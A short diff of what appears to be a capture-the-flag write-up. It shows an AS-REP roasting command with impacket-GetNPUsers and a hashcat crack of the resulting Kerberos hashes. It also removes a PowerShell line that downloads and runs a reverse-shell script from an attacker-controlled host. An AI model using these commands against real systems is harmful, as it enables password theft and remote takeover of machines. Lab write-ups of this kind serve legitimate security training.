@@ -12,5 +12,3 @@ impacket-GetNPUsers DomainName/ -usersfile real_users -dc-ip 10.10.10.161 -reque
 ```bash
 hashcat -m 18200 hash.txt ~/wordlists/rockyou.txt
 ```
-
-powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24:8080/mini-reverse.ps1')
